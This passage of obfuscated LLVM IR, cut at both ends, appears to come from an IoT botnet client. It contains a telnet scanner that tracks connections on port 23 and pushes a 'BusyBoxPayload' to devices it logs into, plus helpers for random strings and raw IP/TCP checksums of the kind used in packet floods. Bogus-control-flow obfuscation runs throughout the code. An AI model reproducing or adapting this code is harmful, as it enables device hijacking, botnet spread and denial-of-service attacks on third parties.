  %962 = icmp slt i32 %957, 10
  %963 = or i1 %961, %962
  br i1 %963, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br label %1107

; <label>:964:                                    ; preds = %178
  %965 = call i64 @time(i64* null) #3
  %966 = trunc i64 %965 to i32
  %967 = load i32, i32* %13, align 4
  %968 = sext i32 %967 to i64
  %969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %968
  %970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %969, i32 0, i32 7
  store i32 %966, i32* %970, align 16
  %971 = load i32, i32* %13, align 4
  %972 = sext i32 %971 to i64
  %973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %972
  %974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %973, i32 0, i32 0
  %975 = load i32, i32* %974, align 16
  %976 = call i64 @send(i32 %975, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.95, i32 0, i32 0), i64 4, i32 16384)
  %977 = icmp slt i64 %976, 0
  br i1 %977, label %978, label %979

; <label>:978:                                    ; preds = %964
  br label %979

; <label>:979:                                    ; preds = %978, %964
  %980 = load i32, i32* %13, align 4
  %981 = sext i32 %980 to i64
  %982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %981
  %983 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %982, i32 0, i32 0
  %984 = load i32, i32* %983, align 16
  %985 = call i64 @send(i32 %984, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.96, i32 0, i32 0), i64 7, i32 16384)
  %986 = icmp slt i64 %985, 0
  br i1 %986, label %987, label %1004

; <label>:987:                                    ; preds = %979
  %988 = load i32, i32* @x.77
  %989 = load i32, i32* @y.78
  %990 = sub i32 %988, 1
  %991 = mul i32 %988, %990
  %992 = urem i32 %991, 2
  %993 = icmp eq i32 %992, 0
  %994 = icmp slt i32 %989, 10
  %995 = or i1 %993, %994
  br i1 %995, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %987
  %996 = load i32, i32* @x.77
  %997 = load i32, i32* @y.78
  %998 = sub i32 %996, 1
  %999 = mul i32 %996, %998
  %1000 = urem i32 %999, 2
  %1001 = icmp eq i32 %1000, 0
  %1002 = icmp slt i32 %997, 10
  %1003 = or i1 %1001, %1002
  br i1 %1003, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br label %1004

; <label>:1004:                                   ; preds = %originalBBpart2106, %979
  %1005 = load i32, i32* @x.77
  %1006 = load i32, i32* @y.78
  %1007 = sub i32 %1005, 1
  %1008 = mul i32 %1005, %1007
  %1009 = urem i32 %1008, 2
  %1010 = icmp eq i32 %1009, 0
  %1011 = icmp slt i32 %1006, 10
  %1012 = or i1 %1010, %1011
  br i1 %1012, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %1004
  %1013 = load i32, i32* %13, align 4
  %1014 = sext i32 %1013 to i64
  %1015 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1014
  %1016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1015, i32 0, i32 0
  %1017 = load i32, i32* %1016, align 16
  %1018 = load i8*, i8** @BusyBoxPayload, align 8
  %1019 = load i8*, i8** @BusyBoxPayload, align 8
  %1020 = call i64 @strlen(i8* %1019) #9
  %1021 = call i64 @send(i32 %1017, i8* %1018, i64 %1020, i32 16384)
  %1022 = icmp slt i64 %1021, 0
  %1023 = load i32, i32* @x.77
  %1024 = load i32, i32* @y.78
  %1025 = sub i32 %1023, 1
  %1026 = mul i32 %1023, %1025
  %1027 = urem i32 %1026, 2
  %1028 = icmp eq i32 %1027, 0
  %1029 = icmp slt i32 %1024, 10
  %1030 = or i1 %1028, %1029
  br i1 %1030, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br i1 %1022, label %1031, label %1035

; <label>:1031:                                   ; preds = %originalBBpart2110
  %1032 = load i32, i32* %13, align 4
  %1033 = sext i32 %1032 to i64
  %1034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1033
  call void @reset_telstate(%struct.telstate_t* %1034)
  br label %1108

; <label>:1035:                                   ; preds = %originalBBpart2110
  %1036 = load i32, i32* @x.77
  %1037 = load i32, i32* @y.78
  %1038 = sub i32 %1036, 1
  %1039 = mul i32 %1036, %1038
  %1040 = urem i32 %1039, 2
  %1041 = icmp eq i32 %1040, 0
  %1042 = icmp slt i32 %1037, 10
  %1043 = or i1 %1041, %1042
  br i1 %1043, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %1035
  %1044 = load i32, i32* %13, align 4
  %1045 = sext i32 %1044 to i64
  %1046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1045
  %1047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1046, i32 0, i32 7
  %1048 = load i32, i32* %1047, align 16
  %1049 = add i32 %1048, 25
  %1050 = zext i32 %1049 to i64
  %1051 = call i64 @time(i64* null) #3
  %1052 = icmp slt i64 %1050, %1051
  %1053 = load i32, i32* @x.77
  %1054 = load i32, i32* @y.78
  %1055 = sub i32 %1053, 1
  %1056 = mul i32 %1053, %1055
  %1057 = urem i32 %1056, 2
  %1058 = icmp eq i32 %1057, 0
  %1059 = icmp slt i32 %1054, 10
  %1060 = or i1 %1058, %1059
  br i1 %1060, label %originalBBpart2123, label %originalBB112alteredBB

originalBBpart2123:                               ; preds = %originalBB112
  br i1 %1052, label %1061, label %1106

; <label>:1061:                                   ; preds = %originalBBpart2123
  %1062 = load i32, i32* @x.77
  %1063 = load i32, i32* @y.78
  %1064 = sub i32 %1062, 1
  %1065 = mul i32 %1062, %1064
  %1066 = urem i32 %1065, 2
  %1067 = icmp eq i32 %1066, 0
  %1068 = icmp slt i32 %1063, 10
  %1069 = or i1 %1067, %1068
  br i1 %1069, label %originalBB125, label %originalBB125alteredBB

originalBB125:                                    ; preds = %originalBB125alteredBB, %1061
  %1070 = load i32, i32* %13, align 4
  %1071 = sext i32 %1070 to i64
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1071
  %1073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1072, i32 0, i32 3
  %1074 = load i8, i8* %1073, align 1
  %1075 = zext i8 %1074 to i32
  %1076 = icmp ne i32 %1075, 3
  %1077 = load i32, i32* @x.77
  %1078 = load i32, i32* @y.78
  %1079 = sub i32 %1077, 1
  %1080 = mul i32 %1077, %1079
  %1081 = urem i32 %1080, 2
  %1082 = icmp eq i32 %1081, 0
  %1083 = icmp slt i32 %1078, 10
  %1084 = or i1 %1082, %1083
  br i1 %1084, label %originalBBpart2127, label %originalBB125alteredBB

originalBBpart2127:                               ; preds = %originalBB125
  br i1 %1076, label %1085, label %1086

; <label>:1085:                                   ; preds = %originalBBpart2127
  br label %1086

; <label>:1086:                                   ; preds = %1085, %originalBBpart2127
  %1087 = load i32, i32* @x.77
  %1088 = load i32, i32* @y.78
  %1089 = sub i32 %1087, 1
  %1090 = mul i32 %1087, %1089
  %1091 = urem i32 %1090, 2
  %1092 = icmp eq i32 %1091, 0
  %1093 = icmp slt i32 %1088, 10
  %1094 = or i1 %1092, %1093
  br i1 %1094, label %originalBB129, label %originalBB129alteredBB

originalBB129:                                    ; preds = %originalBB129alteredBB, %1086
  %1095 = load i32, i32* %13, align 4
  %1096 = sext i32 %1095 to i64
  %1097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1096
  call void @reset_telstate(%struct.telstate_t* %1097)
  %1098 = load i32, i32* @x.77
  %1099 = load i32, i32* @y.78
  %1100 = sub i32 %1098, 1
  %1101 = mul i32 %1098, %1100
  %1102 = urem i32 %1101, 2
  %1103 = icmp eq i32 %1102, 0
  %1104 = icmp slt i32 %1099, 10
  %1105 = or i1 %1103, %1104
  br i1 %1105, label %originalBBpart2131, label %originalBB129alteredBB

originalBBpart2131:                               ; preds = %originalBB129
  br label %1106

; <label>:1106:                                   ; preds = %originalBBpart2131, %originalBBpart2123
  br label %1107

; <label>:1107:                                   ; preds = %1106, %originalBBpart2102, %796, %750, %637, %595, %originalBBpart251, %402, %178
  br label %1108

; <label>:1108:                                   ; preds = %1107, %1031, %916, %792, %780, %703, %633, %621, %originalBBpart255, %482, %478, %351, %originalBBpart239, %259
  %1109 = load i32, i32* %13, align 4
  %1110 = add nsw i32 %1109, 1
  store i32 %1110, i32* %13, align 4
  br label %160

; <label>:1111:                                   ; preds = %160
  br label %158
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %1113 = alloca i32, align 4
  %1114 = alloca i32, align 4
  %1115 = alloca i32, align 4
  %1116 = alloca i32, align 4
  %1117 = alloca i32, align 4
  %1118 = alloca i32, align 4
  %1119 = alloca [128 x i8], align 16
  %1120 = alloca i8, align 1
  %1121 = alloca i32, align 4
  %1122 = alloca %struct.fd_set, align 8
  %1123 = alloca %struct.timeval, align 8
  %1124 = alloca i32, align 4
  %1125 = alloca i32, align 4
  %1126 = alloca [256 x i8], align 16
  %1127 = alloca i8*, align 8
  %1128 = alloca %struct.sockaddr_in, align 4
  %1129 = alloca i8*, align 8
  %1130 = alloca i8*, align 8
  %1131 = alloca i32, align 4
  %1132 = alloca i32, align 4
  store i32 %0, i32* %1113, align 4
  store i32 %1, i32* %1114, align 4
  %1133 = load i32, i32* %1114, align 4
  store i32 %1133, i32* %1121, align 4
  %1134 = call i64 @time(i64* null) #3
  %1135 = call i32 @rand_cmwc()
  %1136 = zext i32 %1135 to i64
  %_ = sub i64 0, %1134
  %gen = add i64 %_, %1136
  %_1 = sub i64 0, %1134
  %gen2 = add i64 %_1, %1136
  %1137 = xor i64 %1134, %1136
  %1138 = trunc i64 %1137 to i32
  call void @srand(i32 %1138) #3
  %1139 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1128, i32 0, i32 0
  store i16 2, i16* %1139, align 4
  %1140 = call zeroext i16 @htons(i16 zeroext 23) #10
  %1141 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1128, i32 0, i32 1
  store i16 %1140, i16* %1141, align 2
  %1142 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1128, i32 0, i32 3
  %1143 = getelementptr inbounds [8 x i8], [8 x i8]* %1142, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1143, i8 0, i64 8, i32 4, i1 false)
  %1144 = call noalias i8* @malloc(i64 1025) #3
  store i8* %1144, i8** %1127, align 8
  %1145 = load i8*, i8** %1127, align 8
  call void @llvm.memset.p0i8.i64(i8* %1145, i8 0, i64 1025, i32 1, i1 false)
  %1146 = load i32, i32* %1121, align 4
  %1147 = zext i32 %1146 to i64
  %1148 = call i8* @llvm.stacksave()
  store i8* %1148, i8** %1129, align 8
  %1149 = alloca %struct.telstate_t, i64 %1147, align 16
  %1150 = load i32, i32* %1121, align 4
  %1151 = zext i32 %1150 to i64
  %1152 = alloca i32, i64 %1151, align 16
  %1153 = bitcast %struct.telstate_t* %1149 to i8*
  %1154 = load i32, i32* %1121, align 4
  %1155 = sext i32 %1154 to i64
  %_3 = sub i64 0, %1155
  %gen4 = add i64 %_3, 5
  %_5 = shl i64 %1155, 5
  %_6 = sub i64 %1155, 5
  %gen7 = mul i64 %_6, 5
  %_8 = shl i64 %1155, 5
  %_9 = sub i64 %1155, 5
  %gen10 = mul i64 %_9, 5
  %_11 = sub i64 0, %1155
  %gen12 = add i64 %_11, 5
  %1156 = mul i64 %1155, 5
  call void @llvm.memset.p0i8.i64(i8* %1153, i8 0, i64 %1156, i32 16, i1 false)
  store i32 0, i32* %1115, align 4
  br label %originalBB

originalBB13alteredBB:                            ; preds = %originalBB13, %63
  %1157 = load i32, i32* %13, align 4
  %1158 = load i32, i32* %19, align 4
  %1159 = icmp slt i32 %1157, %1158
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %83
  %1160 = load i32, i32* %13, align 4
  %1161 = sext i32 %1160 to i64
  %1162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1161
  %1163 = bitcast %struct.telstate_t* %1162 to i8*
  call void @llvm.memset.p0i8.i64(i8* %1163, i8 0, i64 32, i32 16, i1 false)
  %1164 = load i32, i32* %13, align 4
  %1165 = sext i32 %1164 to i64
  %1166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1165
  %1167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1166, i32 0, i32 3
  store i8 1, i8* %1167, align 1
  %1168 = load i8*, i8** %25, align 8
  %1169 = load i32, i32* %13, align 4
  %1170 = sext i32 %1169 to i64
  %1171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1170
  %1172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1171, i32 0, i32 9
  store i8* %1168, i8** %1172, align 8
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %116
  store i32 0, i32* %15, align 4
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %141
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %185
  %1173 = load i32, i32* %13, align 4
  %1174 = sext i32 %1173 to i64
  %1175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1174
  %1176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1175, i32 0, i32 3
  %1177 = load i8, i8* %1176, align 1
  %1178 = zext i8 %1177 to i32
  %1179 = icmp eq i32 %1178, 1
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %264
  %1180 = load i32, i32* %13, align 4
  %1181 = sext i32 %1180 to i64
  %1182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1181
  %1183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1182, i32 0, i32 4
  %1184 = load i8, i8* %1183, align 2
  %1185 = zext i8 %1184 to i64
  %1186 = icmp eq i64 %1185, 0
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %288
  %1187 = load i32, i32* %13, align 4
  %1188 = sext i32 %1187 to i64
  %1189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1188
  %1190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1189, i32 0, i32 3
  store i8 1, i8* %1190, align 1
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %309
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %374
  %1191 = call i32* @__errno_location() #10
  %1192 = load i32, i32* %1191, align 4
  %1193 = icmp ne i32 %1192, 115
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %501
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %548
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %565
  %1194 = load i32, i32* %13, align 4
  %1195 = sext i32 %1194 to i64
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1195
  %1197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1196, i32 0, i32 7
  %1198 = load i32, i32* %1197, align 16
  %_58 = sub i32 0, %1198
  %gen59 = add i32 %_58, 7
  %_60 = sub i32 0, %1198
  %gen61 = add i32 %_60, 7
  %_62 = shl i32 %1198, 7
  %_63 = shl i32 %1198, 7
  %_64 = shl i32 %1198, 7
  %1199 = add i32 %1198, 7
  %1200 = zext i32 %1199 to i64
  %1201 = call i64 @time(i64* null) #3
  %1202 = icmp slt i64 %1200, %1201
  br label %originalBB57

originalBB68alteredBB:                            ; preds = %originalBB68, %655
  %1203 = load i32, i32* %13, align 4
  %1204 = sext i32 %1203 to i64
  %1205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1204
  %1206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1205, i32 0, i32 9
  %1207 = load i8*, i8** %1206, align 8
  %1208 = call i32 @contains_fail(i8* %1207)
  %1209 = icmp ne i32 %1208, 0
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %679
  %1210 = load i32, i32* %13, align 4
  %1211 = sext i32 %1210 to i64
  %1212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1211
  call void @advance_state(%struct.telstate_t* %1212, i32 0)
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %704
  %1213 = load i32, i32* %13, align 4
  %1214 = sext i32 %1213 to i64
  %1215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1214
  %1216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1215, i32 0, i32 7
  %1217 = load i32, i32* %1216, align 16
  %_77 = shl i32 %1217, 3
  %_78 = sub i32 0, %1217
  %gen79 = add i32 %_78, 3
  %1218 = add i32 %1217, 3
  %1219 = zext i32 %1218 to i64
  %1220 = call i64 @time(i64* null) #3
  %1221 = icmp slt i64 %1219, %1220
  br label %originalBB76

originalBB83alteredBB:                            ; preds = %originalBB83, %730
  %1222 = load i32, i32* %13, align 4
  %1223 = sext i32 %1222 to i64
  %1224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1223
  call void @reset_telstate(%struct.telstate_t* %1224)
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %848
  %1225 = load i32, i32* %13, align 4
  %1226 = sext i32 %1225 to i64
  %1227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1226
  call void @advance_state(%struct.telstate_t* %1227, i32 7)
  br label %originalBB87

originalBB91alteredBB:                            ; preds = %originalBB91, %899
  br label %originalBB91

originalBB95alteredBB:                            ; preds = %originalBB95, %917
  %1228 = load i32, i32* %13, align 4
  %1229 = sext i32 %1228 to i64
  %1230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1229
  %1231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1230, i32 0, i32 7
  %1232 = load i32, i32* %1231, align 16
  %_96 = shl i32 %1232, 7
  %1233 = add i32 %1232, 7
  %1234 = zext i32 %1233 to i64
  %1235 = call i64 @time(i64* null) #3
  %1236 = icmp slt i64 %1234, %1235
  br label %originalBB95

originalBB100alteredBB:                           ; preds = %originalBB100, %947
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %987
  br label %originalBB104

originalBB108alteredBB:                           ; preds = %originalBB108, %1004
  %1237 = load i32, i32* %13, align 4
  %1238 = sext i32 %1237 to i64
  %1239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1238
  %1240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1239, i32 0, i32 0
  %1241 = load i32, i32* %1240, align 16
  %1242 = load i8*, i8** @BusyBoxPayload, align 8
  %1243 = load i8*, i8** @BusyBoxPayload, align 8
  %1244 = call i64 @strlen(i8* %1243) #9
  %1245 = call i64 @send(i32 %1241, i8* %1242, i64 %1244, i32 16384)
  %1246 = icmp slt i64 %1245, 0
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %1035
  %1247 = load i32, i32* %13, align 4
  %1248 = sext i32 %1247 to i64
  %1249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1248
  %1250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1249, i32 0, i32 7
  %1251 = load i32, i32* %1250, align 16
  %_113 = sub i32 %1251, 25
  %gen114 = mul i32 %_113, 25
  %_115 = shl i32 %1251, 25
  %_116 = sub i32 %1251, 25
  %gen117 = mul i32 %_116, 25
  %_118 = sub i32 0, %1251
  %gen119 = add i32 %_118, 25
  %_120 = sub i32 %1251, 25
  %gen121 = mul i32 %_120, 25
  %1252 = add i32 %1251, 25
  %1253 = zext i32 %1252 to i64
  %1254 = call i64 @time(i64* null) #3
  %1255 = icmp slt i64 %1253, %1254
  br label %originalBB112

originalBB125alteredBB:                           ; preds = %originalBB125, %1061
  %1256 = load i32, i32* %13, align 4
  %1257 = sext i32 %1256 to i64
  %1258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1257
  %1259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1258, i32 0, i32 3
  %1260 = load i8, i8* %1259, align 1
  %1261 = zext i8 %1260 to i32
  %1262 = icmp ne i32 %1261, 3
  br label %originalBB125

originalBB129alteredBB:                           ; preds = %originalBB129, %1086
  %1263 = load i32, i32* %13, align 4
  %1264 = sext i32 %1263 to i64
  %1265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1264
  call void @reset_telstate(%struct.telstate_t* %1265)
  br label %originalBB129
}

; Function Attrs: nounwind
declare void @srand(i32) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %35, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %38

; <label>:10:                                     ; preds = %6
  %11 = load i32, i32* @x.79
  %12 = load i32, i32* @y.80
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = call i32 @rand_cmwc()
  %20 = urem i32 %19, 26
  %21 = add i32 %20, 65
  %22 = trunc i32 %21 to i8
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  store i8 %22, i8* %26, align 1
  %27 = load i32, i32* @x.79
  %28 = load i32, i32* @y.80
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %35

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* %5, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %5, align 4
  br label %6

; <label>:38:                                     ; preds = %6
  %39 = load i32, i32* @x.79
  %40 = load i32, i32* @y.80
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %38
  %47 = load i32, i32* @x.79
  %48 = load i32, i32* @y.80
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart211, label %originalBB9alteredBB

originalBBpart211:                                ; preds = %originalBB9
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %55 = call i32 @rand_cmwc()
  %_ = sub i32 %55, 26
  %gen = mul i32 %_, 26
  %_1 = shl i32 %55, 26
  %_2 = sub i32 0, %55
  %gen3 = add i32 %_2, 26
  %_4 = shl i32 %55, 26
  %_5 = sub i32 0, %55
  %gen6 = add i32 %_5, 26
  %56 = urem i32 %55, 26
  %_7 = sub i32 %56, 65
  %gen8 = mul i32 %_7, 65
  %57 = add i32 %56, 65
  %58 = trunc i32 %57 to i8
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  store i8 %58, i8* %62, align 1
  br label %originalBB

originalBB9alteredBB:                             ; preds = %originalBB9, %38
  br label %originalBB9
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %25, %2
  %7 = load i32, i32* @x.81
  %8 = load i32, i32* @y.82
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = load i32, i32* %4, align 4
  %16 = icmp sgt i32 %15, 1
  %17 = load i32, i32* @x.81
  %18 = load i32, i32* @y.82
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %16, label %25, label %34

; <label>:25:                                     ; preds = %originalBBpart2
  %26 = load i16*, i16** %3, align 8
  %27 = getelementptr inbounds i16, i16* %26, i32 1
  store i16* %27, i16** %3, align 8
  %28 = load i16, i16* %26, align 2
  %29 = zext i16 %28 to i64
  %30 = load i64, i64* %5, align 8
  %31 = add i64 %30, %29
  store i64 %31, i64* %5, align 8
  %32 = load i32, i32* %4, align 4
  %33 = sub nsw i32 %32, 2
  store i32 %33, i32* %4, align 4
  br label %6

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = load i32, i32* %4, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %37, label %44

; <label>:37:                                     ; preds = %34
  %38 = load i16*, i16** %3, align 8
  %39 = bitcast i16* %38 to i8*
  %40 = load i8, i8* %39, align 1
  %41 = zext i8 %40 to i64
  %42 = load i64, i64* %5, align 8
  %43 = add i64 %42, %41
  store i64 %43, i64* %5, align 8
  br label %44

; <label>:44:                                     ; preds = %37, %34
  br label %45

; <label>:45:                                     ; preds = %65, %44
  %46 = load i32, i32* @x.81
  %47 = load i32, i32* @y.82
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  %54 = load i64, i64* %5, align 8
  %55 = lshr i64 %54, 16
  %56 = icmp ne i64 %55, 0
  %57 = load i32, i32* @x.81
  %58 = load i32, i32* @y.82
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart29, label %originalBB1alteredBB

originalBBpart29:                                 ; preds = %originalBB1
  br i1 %56, label %65, label %71

; <label>:65:                                     ; preds = %originalBBpart29
  %66 = load i64, i64* %5, align 8
  %67 = and i64 %66, 65535
  %68 = load i64, i64* %5, align 8
  %69 = lshr i64 %68, 16
  %70 = add i64 %67, %69
  store i64 %70, i64* %5, align 8
  br label %45

; <label>:71:                                     ; preds = %originalBBpart29
  %72 = load i64, i64* %5, align 8
  %73 = xor i64 %72, -1
  %74 = trunc i64 %73 to i16
  ret i16 %74

originalBBalteredBB:                              ; preds = %originalBB, %6
  %75 = load i32, i32* %4, align 4
  %76 = icmp sgt i32 %75, 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  %77 = load i64, i64* %5, align 8
  %_ = sub i64 0, %77
  %gen = add i64 %_, 16
  %_2 = sub i64 0, %77
  %gen3 = add i64 %_2, 16
  %_4 = sub i64 %77, 16
  %gen5 = mul i64 %_4, 16
  %_6 = sub i64 %77, 16
  %gen7 = mul i64 %_6, 16
  %78 = lshr i64 %77, 16
  %79 = icmp ne i64 %78, 0
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = load i32, i32* @x.83
  %4 = load i32, i32* @y.84
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.iphdr*, align 8
  %12 = alloca %struct.tcphdr*, align 8
  %13 = alloca %struct.tcp_pseudo, align 8
  %14 = alloca i16, align 2
  %15 = alloca i32, align 4
  %16 = alloca i16*, align 8
  %17 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %11, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %12, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 2
  %20 = load i16, i16* %19, align 2
